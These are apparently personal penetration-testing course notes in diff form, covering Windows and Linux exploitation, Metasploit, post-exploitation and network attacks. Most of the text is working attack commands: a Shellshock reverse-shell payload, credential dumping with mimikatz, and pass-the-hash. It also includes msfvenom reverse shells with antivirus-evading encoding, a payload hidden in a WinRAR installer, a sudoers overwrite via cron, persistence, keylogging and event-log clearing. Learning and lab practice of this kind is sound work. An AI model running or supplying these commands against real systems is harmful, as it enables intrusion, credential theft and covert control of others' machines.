+      > Default hashing algorithm that was implemented in Windows OS prior to NT4.0
+      [+] The password is broken into two seven-character chunks 
+      [+] All characters are then converted into uppercase
+      [+] Each chunk is then hashed separately with the DES algorithm.
+      > Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
+      > Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash
+
+    NTLM(NTHash)
+      When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
+      [+] Does not split the hash in to two chunks
+      [+] Case sensitive 
+      [+] Allows the use of symbols and unicode characters
+      [+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
+      > Example: !Passw0rd123. ==> MD4 ==> NTLM hash
+  Searching for passwords in Windows Configuration files
+    >Unattended Windows Setup utility
+      > Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
+      > This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
+      [+] C:\Windows\Panther\Unattend.xml
+      [+] C:\Windows\Panther\Autounattend.xml
+        As a security precaution, the passwords stord in the Unattended Windows Setup configuration file may be encoded in base64
+      > Example:
+          msfconsole -q
+          use exploit/windows/misc/hta_server
+          exploit
+          “This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell". Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
+            Use your own metasploit HTA server link
+              mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
+        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
+        python3 -m http.server 80
+        VM: certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
+        msfconsole 
+          use multi/handler
+          set payload windows/x64/meterpreter/reverse_tcp
+          meterpreter > search -f Unattend.xml
+          psexec.py Administrator@10.2.27.165
+
+      > Utilizing PowerUp.ps1
+        . .\PowerUp.ps1
+        Invoke-PrivescAudit
+        How to base64 decode in Powershell?
+          $password=QWRtaW5AMTIz
+          $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+          echo $password
+        How to run a command as other user?
+          runas.exe /user:administrator cmd
+
+  Dumping hashes with mimikatz
+    > The SAM (Security Account Manager) database, is a database filw on Windows systems that stores hashes user passwords.
+    > Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
+    > We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
+    > Mimikatz will require elevated privileges in order to run correctly.
+
+    > Example:
+        nmap 192.168.188.128
+        service postresql start && msfconsole -q 
+        use exploit/windows/http/badblue_passthru
+        sysinfo
+        getuid
+        pgrep lsass
+        migrate 788
+        getuid
+        load kiwi
+          creds_all
+          lsa_dump_sam
+          lsa_dump_secrets //Some clear password sometimes
+        pwd
+        cd C:\\
+        mkdir Temp
+        cd Temp
+        upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+        .\mimikatz.exe
+          privilege::debug //To ensure that we have enough privileges
+          lsadump::sam
+          lsadump::secrets
+          sekurlsa::logonpasswords //Clear passwords
+
+  Pass-The-Hash attack
+    We can use multiple tools to facilitate this attack like Metasploit PsExec module or Crackmapexec
+    > Example:
+        use exploit/windows/smb/psexec
+          set smbuser administrator
+          set smbpass (Paste LM:NTLM or the clear password)
+
+          set target Command
+          set target Native\ upload
+          sessions -K //To kill all the sessions
+        crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)"
+        crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "ipconfig"
+        crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "net user administrator password123."
+
+
+3.2.1 Linux vulnerabilities
+  Shellshock
+    (){:;};.
+    > In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack
+      CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
+    > Example
+        Manually
+          nmap -sV  192.168.188.126 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
+          In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+          In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>& /dev/tcp/10.10.14.12/4126 0>&1'
+          Another way:
+            curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://195.76.205.3:4127/gettime.cgi
+        msfconsole
+          use exploit/multi/http/apache_mod_cgi_bash_env_exec 
+            set targeturi /gettime.cgi
+          
+  FTP
+    ftp 192.93.66.2
+      anonymous 
+    nmap
+      ftp-anon.nse
+    hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp
+
+  SSH
+    SSH authentication can be configured in two ways:
+      > Username & password authentication
+      > Key based authentication
+    > Example:
+        use auxiliary/scanner/ssh/ssh_version
+        use auxiliary/scanner/ssh/ssh_login
+
+  SAMBA
+    SAMBA utilizes username and password authentication in order to obtain access to the server or a network share
+    hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 smb
+    smbmap
+    smbclient
+    enum4linux
+3.3.1 Linux Kernel exploitation
+  https://github.com/mzet-/linux-exploit-suggester
+  meterpreter > 
+    shell
+    /bin/bash -i
+    sysinfo
+    getuid
+  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+    
+  Cron Jobs
+    Any script or command that have been configured to be run as the "root" user and is run by a Cron Job will run as the root user and will consequently provide us with root access.
+
+    crontab -l
+    cd /
+    grep -rnw (or -nri) /usr -e "/home/student/message" or find / -name message  //Find if a file with the same name exists on the system
+    printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+
+  Exploiting SUID Binaries
+    strings welcome
+    rm -rf greetings
+    cp /bin/bash greetings
+    ./welcome
+
+3.4 Dumping Linux Passwords Hashes
+  The shadow file can only be accessed by the root account.
+  value     Hashing algorithm
+  $1        MD5
+  $2        Blowfish
+  $5        SHA-256
+  $6        SHA-512
+  > Example:
+      msfconsole ==> hashdump
+      cat /etc/shadow
+4. Network-based attacks
+  ARP
+  DHCP
+  SMB
+  FTP
+  Telnet 
+  SSH
+
+  tshark -D
+  tshark -i ens33
+  tshark -r HTTP_traffic.pcap
+  tshark -r HTTP_traffic.pcap -c 100 //Read the first 100 packets
+  tshark -r HTTP_traffic.pcap -z io,phs -q  
+  tshark -r HTTP_traffic.pcap -z io,phs arp
+  tshark -r HTTP_traffic.pcap -Y 'ip contains amazon.in && ip.src==192.168.252.128' -Tfields e ip.src -e http.cookie
+  tshark -r HTTP_traffic.pcap -Y 'ip.src==192.168.252.128 && http' -Tfields -e http.user_agent
+  tshark -r HTTP_traffic.pcap -Y 'http'
+  tshark -r HTTP_traffic.pcap -Y 'http contains password'
+  tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET'
+  tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET' -Tfields -e frame.time -e ip.src -e http.request.full_uri
+  tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET && http.host==www.nytimes.com' -Tfields -e ip.dst
+  tshark -r HTTP_traffic.pcap -Y 'ip.src=192.168.188.126 && ip.dst=34.45.62.56'
+
+  ARP poisoning
+    Before running the tool, you have to enable the Linux Kernelt IP Forwarding (this feature transforms a Linux box into a router. This tell your machine to forward the packets you intercept to the real destination host)
+      echo 1 > /proc/sys/net/ipv4/ip_forward 
+      arpspoof -i <interface> -t <target> -r <host>
+  
+  WiFi Traffic Analysis
+    wireshark
+      Protocol Hierarchy ==> 802.11
+      (wlan.fc.type_subtype==0x0008) && !(wlan.wfa.ie.wpa.version==1) && !(wlan.tag.number==48) //Beacon frame && not wpa1 && not Robust Security Network interface // Open SSIDs
+        wlan.fixed.capabilities.privacy==0 
+      wlan contains Home_Network
+      (wlan.ssid contains Amazon) && (wlan.fc.type_subtype == 0x0008) //To know if WPA is enabled
+      (wlan.ta == e8:de:27:16:87:18) || (wlan.ra == e8:de:27:16:87:18) //How many packets has transmited and recieved this MAC
+      ((wlan.bssid==e8:de:27:16:87:18) && (wlan.fc.type_subtype==0x0020))
+      (((wlan.bssid==e8:de:27:16:87:18)) && (wlan.addr == 5c:51:88:31:a0:3b)) && (wlan.fc.type_subtype==0x0001) //Association Response 
+    tshark 
+      tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' //Deauthentication packets
+      tshark -r WiFi_traffic.pcap -Y 'eapol' //Only display WPA handshake packets
+      tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==8' -Tfields -e wlan.ssid -e wlan.bssid //Only SSID and BSSID values for all beacon frames
+      tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==LazyArtists' -Tfields -e wlan.bssid
+      tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==Home_Network' -Tfields -e wlan_radio.channel
+      tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' -Tfields -e wlan.ra
+      tshark -r WiFi_traffic.pcap -Y 'wlan.ta==5c:51:88:31:a0:3b && http' -Tfields -e http.user_agent
+
+5. The Metasploit Framework
+  5.1 Overview
+    MSF Architecture
+      Interfaces: MSFconsole, MSFcli, Armitage & Web
+      Modules: 
+        exploit, 
+        payload:
+          > It is an advanced multi-functional paylaod that is executed in memory on the target system making it difficult to detect. It is not downloaded to the target system or is not executed on disk. As a result, no traces of the payload are left or are found on the target system
+          Stageless (or Non-Staged payload): Payload that is sent to the taget system as is along with the exploit
+          Staged payload : It is sent to the target in two parts whereby:
+            Stagers: Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system
+            Stage: Payload components that are downloaded by the stager
+
+        encoder(For example, shikata_ga_nai is used to encode Windows payloads)
+        NOPS(Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed)
+        auxiliary
+      Libraries: Rex, MSF Core & MSF Base
+      
+    MSF module locations
+      MSF stores modules under the following directory
+        /usr/share/metasploit-framework/modules
+      User specified modules are stored here:
+        ~/.ms5/modules
+
+    Starting
+      msfdb run
+        db_status
+   MSFconsole fundamentals
+    version
+    show -h
+      show all // Show all modules
+      show exploits 
+    search portscan
+      use auxiliary/scanner/portscan/tcp 
+      (Once you have used it) back
+    search -h
+      search cve:2017 type:exploit platform:-windows
+      search cve:2017 type:exploit platform:+windows
+      search eternalblue
+    sessions
+    connect -h 
+      connect 192.168.188.126 80
+
+  Creating and managin workspaces
+    workspace -h
+      workspace
+      hosts
+      workspace -a Test
+      workspace 
+      workspace default
+      workspace INE
+      workspace -d Test //delete
+      workspace -r INE PTA //rename
+
+  Information Gathering & Enumeration
+    Port scanning & enumeration with nmap
+      nmap -Pn -sV -O 10.2.33.173 -oX windows_server_2012_results
+      Importing nmap scan results into msf
+        service postresql start
+        msfconsole
+          db_status
+          workspace -a Win2k12
+            db_import /root/windows_server_2012_results
+            hosts
+            services
+            loot
+            creds
+          workspace -a Nmap_MSF
+            db_nmap -Pn -sV -O 10.2.33.173 
+            vulns
+    Port scanning with auxiliary modules //Ideal for pivoting
+      msfconsole
+        search portscan
+          use auxiliary/scanner/portscan/tcp
+        //Once we have gained a meterpreter session
+          meterpreter > run autoroute -s 192.112.57.2 //The IP on the other interface of the first target machine
+        //BG this session and run portscan against the new target (192.112.57.3)
+          Bash Script:
+          #!/bin/bash
+          for port in {1..1000}; do
+          timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+          done)
+      FTP enumeration
+        search portscan
+          use auxiliary/scanner/portscan/tcp
+        search ftp type:auxiliary
+          use auxiliary/scanner/ftp/ftp_version
+            [Manually: nc -vn 192.19.87.3]
+            searchsploit the version
+          use auxiliary/scanner/ftp/ftp_login //brute force 
+            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
+            set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+          use auxiliary/scanner/ftp/anonymous
+            
+      SMB enumeration
+        setg RHOSTS 192.91.46.3
+        search type:auxiliary smb
+        use auxiliary/scanner/smb/smb_version
+        use auxiliary/scanner/smb/smb_enumshares
+          set showfiles true
+        use auxiliary/scanner/smb/smb_login
+          set smbuser admin
+          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+
+      Web Server enumeration
+        search type:auxiliary http
+        use auxiliary/scanner/http/http_version
+        use auxiliary/scanner/http/http_header
+        use auxiliary/scanner/http/http_put
+          set filename test.txt
+          set filedad "Welcome"
+        use auxiliary/scanner/http/http_login
+        use auxiliary/scanner/http/robots_txt
+        use auxiliary/scanner/http/dir_scanner
+        use auxiliary/scanner/http/brute_dirs
+        use auxiliary/scanner/http/dir_listing
+        use auxiliary/scanner/http/files_dir
+          set auth_uri /secure/ //The directory target
+          unset userpass_file for not be equal to user_file
+        use auxiliary/scanner/http/apache_userdir_enum
+
+      MySQL enumeration
+        search type:auxiliary mysql
+        use auxiliary/scanner/mysql/mysql_version
+        use auxiliary/scanner/mysql/mysql_login
+          set username root
+          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+        use auxiliary/scanner/mysql/mysql_enum
+        use auxiliary/scanner/mysql/mysql_sql //To execute commands
+        use auxiliary/scanner/mysql/mysql_file_enum
+          set file_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+        use auxiliary/scanner/mysql/mysql_hashdump
+        use auxiliary/scanner/mysql/mysql_schemadump
+        use auxiliary/scanner/mysql/msyql_writable_dirs
+
+      SSH enumeration
+        workspace -a SSH_enum
+        search type:auxiliary name:ssh
+        use auxiliary/scanner/ssh
+          ssh_version
+          ssh_login //Password authentication
+            set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
+          ssh_login_pubkey //Key based authentication
+          ssh_enumusers
+
+      SMTP enumeration (SPF,DKIM & DMARC)
+        search type:auxiliary name:smtp
+        use auxiliary/scanner/stmp
+          smtp_version
+          smtp_enum
+        manually
+          ismtp
+            ismtp -h 192.22.47.3 -e /mydic.txt
+          sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+           swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
+
+  Vulnerability scanning
+    service postgresql start
+    msfconsole -q
+      db_status
+      workspace -a MS3
+      db_nmap -sS -sV -O 10.10.10.4
+      hosts
+      services
+      search type:exploit name:Microsoft IIS
+      
+      analyze 
+      vulns
+    //If we would like to import Nessus results
+        db_import /home/MS3_fkthix.nessus
+        vulns -p445
+        search cve:2017 name:smb or another different would be search cve:2012 name:rdp
+    > You can use https://github.com/hahwul/metasploit-autopwn
+      msfconsole -q
+        load db_autopwn(Deprecated but it still works. Manual installation)
+        db_autopwn -p -t -PI 445
+    WMAP(web application vulnerability scanner)
+      available as an MSF plugin and can be loadad directly in MSF
+      load wmap
+        wmap_sites -a 192.157.89.3
+        wmap_targets -t http://192.157.89.3
+        wmap_sites -l //Available sites
+        wmap_targets -l //Available targets
+        wmap_run -t //All the modules that will be used
+        wmap_run -e //Run it
+        wmap_vulns -l
+      use auxiliary/scanner/http/options
+      use auxiliary/scanner/http/http_put
+        set PATH /data
+
+  Client-side attacks
+    Generating payloads with Msfvenom
+      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
+      msfvenom --list payloads
+      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe
+      msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx64.exe
+      msfvenom --list formats //List valid executable formats 
+      msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx86
+      msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx64
+        elf //Linux binary
+
+        How to transfer this files?
+          sudo python -m SimpleHttpServer 80
+        
+        We await from a connection back //Example
+          msfconsole -q 
+           set payload linux/x86/meterpreter/reverse_tcp
+           use exploit/multi/handler 
+
+    Encoding payloads with Msfvenom
+      We can evade older signature based AV solutions by encoding our payloads.
+      msfvenom --list encoders
+        x86/shikata_ga_nai
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe
+        //Pay attention with the iterations
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 x86/shikata_ga_nai -f elf > encodedx86Linux
+
+    Injecting payloads into Windows portable executables //To avoid AV detection
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > winrar.exe
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > winrar-new.exe //To mantain the original functioning. It will not work all times
+      msfconsole -q 
+        use multi/handler
+        //Once we have a session.
+          sysinfo
+          run post/windows/manage/migrate 
+    Automating Metasploit with resource scripts
+      ls -al /usr/share/metasploit-framework/scripts/resource      
+      vim handler.rc
+        use multi/handler
+        set PAYLOAD windows/meterpreter/reverse_tcp 
+        set LHOST 10.10.10.5
+        set LPORT 4126
+        run
+      msfconsole -r handler.rc
+      //Another
+      vim portscan.rc
+        use auxiliary/scanner/portscan/tcp
+        set RHOSTS 10.10.10.7
+        run
+      msfconsole -r portscan.rc
+      //Other
+      vim db_status.rc
+        db_status
+        workspace 
+        workspace -a Test
+      //Upload it directly from msfconsole
+      msfconsole -q
+        resource ~/Documents/handler.rc //Load a resource script
+        //Save last commands with makerc
+          [msf](Jobs:0 Agents:0) exploit(multi/handler) >> makerc ~/Desktop/ajgs/
+          [*] Saving last 4 commands to ~/Desktop/ajgs/ ...
+    Exploitation
+      Windows Exploitation
+        Exploiting a vulnerable HTTP file server
+          > You can't host a website on the HTTP file server (For example: Rejetto HFS ==> Free and open source)
+          service postgresql start
+          msfconsole -q
+            db_status
+            workspace -a HFS
+            db_nmap -sS -sV -O 10.2.23.159
+            search type:exploit name:rejetto
+            use exploit/windows/http/rejetto_hfs_exec
+            set payload //It is necessary because if you don't specify the payload it may assign an x86 instead an x64
+        Exploiting Apache Tomcat
+          It is a free and open source Java servlet web server
+          It is used to build and host dynamic websites and web applications based on the Java software platform
+          It utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
+          It runs on TCP port 8080 by default
+          What's the difference between Apache and Apache Tomcat?
+            > The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP
+            > The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed by Java
+          msfconsole -q
+          //After using db_nmap
+            services  //To check open ports
+            search type:exploit tomcat_jsp
+            use exploit/multi/http/tomcat_jstp_upload_bypass
+              info
+              set payload java/jsp_shell_bind_tcp
+              set shell cmd
+              //In another tab to migrate to a meterpreter shell
+              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4126 -f exe > meterpreter.exe
+              python3 -m http.server 80
+              certutil -urlcache -f http://10.10.10.4/meterpreter.exe meterpreter.exe
+            vim handler.rc
+              use multi/handler 
+              set PAYLOAD windows/meterpreter/reverse_tcp
+              set LHOST 10.10.5.4
+              set LPORT 4126
+              run
+            msfconsole -r handler.rc
+  Linux Exploitation
+    Exploiting a vulnerable FTP server
+      vsftpd is the default FTP server for Ubuntu, CentOS and Fedora
+      msfconsole -q 
+      //Once we have gained access to change the normal shell to a meterpreter shell
+        use post/multi/manage/shell_to_meterpreter
+    Exploiting Samba
+      msfconsole -q
+        use exploit/linux/samba/is_known_pipename
+          check
+      //Once we have gained access to change the normal shell to a meterpreter shell
+        use post/multi/manage/shell_to_meterpreter
+          set LHOST eth1
+    Exploiting a vulnerable SSH server
+      libssh is a multiplataform C library implementing the SSHv2 protocol on client and server side
+      use auxiliary/scanner/ssh/libssh_auth_bypass
+        set spwan_pty true
+          cat /etc/*release
+    Exploiting SMTP
+      Haraka is an open source high performance SMTP server developed in Node.js.
+      > Haraka versions prior to 2.8.9 are vulnerable to command injection
+      msfconsole -q
+        use exploit/linux/smtp/haraka
+        set SRVPORT 9898
+        set email_to root@attackdefense.test 
+        set payload linux/x64/meterpreter_reverse_http
+        set LHOST eth1
+
+  Post exploitation fundamentals
+    Meterpreter fundamentals
+      > The meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
+      > It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
+      sessions -C sysinfo -i 1 //Run a meterpreter command on a session
+      sessions -n xodanamewhateveryoulike -i 1
+      meterpreter>
+        lpwd //Check present working directory on local(attacker) machine
+        lls //List the files present in current directory of the local machine
+        lcd //Change directory on the local machine
+        cat flag
+        edit flag 
+        download flag5.zip /root/Desktop 
+        checksum md5 /bin/bash
+        getenv PATH
+        getenv TERM
+        search 
+        search -d /usr/bin -f *backdoor*
+        search -f *.jpg
+        search -f *.php
+        download flag1
+        shell
+          /bin/bash -i
+        ps
+        migrate 580
+        migrate -N apache2
+        execute -f ifconfig
+    Upgrading command shells to meterpreter shells
+      Using shell_to_meterpreter 
+        use shell_to_meterpreter
+          set session 1
+          set lhost eth1
+          sessions -l
+      Or upgrade a commmand shell with the '-u' parameter
+        sessions -u 1
+    Windows Post exploitation modules
+      meterpreter > 
+        screenshot
+        getsystem //Privesc
+        hashdump
+        show_mount //Drives or mounts 
+        ps
+        migrate 2212 //explorer.exe
+      search migrate 
+        use post/windows/manage/migrate
+      search win_privs
+        use post/windows/gater/win_privs
+          set session 1
+      search enum_logged_on
+        use post/windows/gather/enum_logged_on_users  //Current and recently logged users
+      search checkvm //To know if the target is a virtual machine
+        use post/windows/gather/checkvm
+      search enum_applications //Enum installed applications
+        post/windows/gather/enum_applications 
+      //Access the data gathered
+        loot
+      search type:post platform:windows enum_av
+        post/windows/gather/enum_av_excluded 
+      post/windows/gather/enum_computers 
+      post/windows/gather/enum_patches
+      post/windows/gather/enum_shares
+      post/windows/manage/enable_rdp
+    Bypassing UAC
+      getuid
+      getprivs 
+      shell
+        net users
+        net localgroup administrators 
+      use exploit/windows/local/bypassuac_injection 
+        set payload windows/x64/meterpreter/reverse_tcp
+        set target Windows\ x64 //If x86 target is selected
+    Token Impersonation with Incognito
+      load incognito
+        list_tokens -u //User tokens
+        impersonate_token "ATTACKDEFENSE\Administrator"
+        migrate 3544 //explorer.exe. Esto lo hago porque se han quedado los access tokens cacheados
+        hashdump
+    Establishing persistence on windows
+      use exploit/windows/local/persistence_service 
+        set service_name badservice
+        set payload windows/meterpreter/reverse_tcp
+      //Once we have done this, we will have persistence
+      use exploit/multi/handler
+    Enabling RDP
+      use post/windows/manage/enable_rdp
+        net user administrator hacker_123! //Change administrator password
+    Windows keylogging
+      meterpreter >
+        migrate 2460 //explorer.exe
+        keyscan_start
+        kesycan_dump
+        keyscan_stop
+    Clearing Windows Event Logs
+      meterpreter > 
+        clearev
+    Pivoting
+      meterpreter > 
+        ipconfig //Copy the other IP 
+        run autoroute -s 10.2.27.0/20 //-s = subnet //Only applicable to msfconsole
+      use auxiliary/scanner/portscan/tcp
+        set rhosts [IP victim 2]
+      meterpreter > 
+        portfwd add -l 1234 -p 80 -r 10.2.27.187
+      db_nmap -sS -sv -p 1234 localhost 
+      use exploit/windows/http/badblue_passthru
+        set payload windows/meterpreter/bind_tcp
+  Linux post exploitation modules
+    meterpreter > 
+      sysinfo
+      getuid
+      shell
+        cat /etc/passwd
+        groups root
+        cat /etc/*issue
+        uname -r 
+        uname -a
+        netstat -antp
+        ps aux
+        env
+      post/linux/gather/enum_configs //Several interesting files
+      post/linux/gather/enum_network
+      post/linux/gather/enum_protections
+      post/linux/gather/enum_system
+      post/linux/gather/checkcontainer
+      post/linux/gather/checkvm
+      post/linux/gather/enum_users_history //Maybe some users have typed passwords in clear text
+      post/linux/gather/hashdump
+      post/linux/gather/ecryptfs_creds
+      post/linux/gather/enum_psk
+      post/linux/gather/enum_xchat
+      post/linux/gather/phpmyadmin_credsteal
+      post/linux/gather/pptpd_chap_secrets
+      post/linux/manage/donwload_exec
+      post/linux/manage/sshkey_persistence
+      post/multi/gather/env //Enviromental variables 
+      post/multi/gather/ssh_creds
+      post/multi/gather/docker_creds
+      post/multi/manage/system_session
+        set type python
+        set handler true
+      > notes //system protections saved to notes
+      > loot //Display the information gathered by a post exploitation module
+    Exploiting a vulnerable application
+      chkrootkit -v 
+      use exploit/unix/local/chkrootkit
+        set chkrootkit /bin/chkrootkit //The PATH of chkrootkit
+    Dumping hashes with Hashdump
+      use post/linux/gather/hashdump
+    Establishing persistence on Linux
+      Manually
+        useradd -m /www/var/html/ftp -s /bin/bash
+        passwd ftp
+        groups root
+        usermod -aG root ftp
+        groups ftp
+        usermod -u 15 ftp //Modify user ID
+      use exploit/linux/local/cron_persistence
+      use exploit/linux/local/service_persistence
+        set payload cmd/unix/reverse_python
+      post/linux/manage/sshkey_persistence
+        set createsshfolder true
+Exploitation
+  Vulnerability scanning overview
+    Banner grabing
+      banner.nse
+      nc 192.168.113.3 22
+      ssh root@192.168.113.3 22 //May give you some information
+    With Nmap scripts
+      nmap -sV -p 80 --script=http-waf-detect 192.168.113.3
+      ❯ ls -la /usr/share/nmap/scripts | grep shellshock
+        nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.168.113.3
+  Searching for publicly available exploits
+    + Exploit-db
+    + Rapid7
+    + Packet strom
+    + searchsploit
+        ls -la /usr/share/exploitdb
+        searchsploit -u //Update exploitdb
+        searchsploit -t java #Por titulo
+        searchsploit -p 39166 #Copia al portapapeles
+        searchsploit -m 39166 #Ademas copia al directorio actual 
+        searchsploit -x 39166 #Examinar
+        searchsploit -x --nmap resultado.xml
+        searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
+        searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
+        searchsploit -c ProFTPD 1.3.5 #Case sensitive
+        searchsploit remote windows smb -w | grep -e "EternalBlue" //Show the URL
+        searchsploit remote linux ssh
+  Fixing Exploits
+    cp /usr/share/windows-resources/binaries/nc.exe
+  Cross-compiling exploits
+    Cross-compiling is the process of compiling code for a platfrom other than the one performing the compilation
+    In Windows
+      apt-get install mingw-w64 gcc
+      searchsploit -m 9303
+      i686-w64-mingw32-gcc 9303.c -o exploit
+      i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
+    In Linux
+      searchsploit -m 40839
+      gcc -pthread 40839 -o exploit -lcrypt
+    We could use the precompiled binaries from exploitdb
+      https://gitlab.com/exploit-database/exploitdb-bin-sploits
+  
+  Netcat Fundamentals
+    > Network utility used to read and write data to network connections using TCP or UDP
+    > Netcat can be used to perform:
+      - Banner Grabbing
+      - Port Scanning
+      - Transferring Files
+      - Bind/Reverse Shells
+    nc 
+      -v //verbose
+      -u //udp
+      -l //listen
+      -n //nodns
+      -e //exec 
+    > How to transfer nc.exe to a Windows machine
+      A: ls -la /usr/share/windows-resources/
+      A: python3 -m http.server 80
+      V: certutil -urlcache -f http://<AttackIP>/nc.exe nc.exe
+      //Another way
+      A: vim test.txt
+      V: nc.exe -nvlp 1234 > test.txt
+      A: nc -nv VictimMachine 1234 < test.txt
+
+  Bind Shells
+    > A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system
+    > A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.
+    > Example (From Linux to Windows)
+        V: nc -nvlp 1234 -e cmd.exe 
+        A: nc -nv 10.4.21.221 1234
+
+    > Other example (From Windows to Linux)
+        A: nc -nvlp 1234 -c /bin/bash //In Linux
+        V: nc.exe -nv 10.10.3.2 1234
+
+  Reverse shells
+    > Example(From Linux to Linux)
+        nc -nv 10.10.0.2 1234 -e /bin/bash
+        nc -nvlp 1234
+      
+    > Other example(From Windows to Linux)
+        A: nc -nlvp 1234
+        V: nc.exe -nv 10.10.0.2 1234 -e cmd.exe
+
+    > Reverse shell Cheatsheet 
+        https://github.com/swisskyrepo/PayloadsAllTheThings
+        https://www.revshells.com/
+
+  PowerShell-Empire
+    > It is a pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture
+    > Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz and adaptable communications to evade network detection, all wrapped up in a usability-focused framework
+    > Starkiller is the GUI
+    > Usage
+        apt-get install powershell-empire starkiller -y
+        sudo powershell-empire server
+        sudo powershell-empire client
+          listeners
+          agents
+        starkiller (Default credentials: empireadmin:password123)
+          
+
+Windows Black Box Penetration Test
+  Port scanning & enumeration
+  Targeting Microsoft IIS FTP
+    In most cases, the FTP server is used to transfer files to and from the directory of the web server. As a result, if we are able to gain access to the FTP server, we may be able access the directory of the Microsoft IIS web server.
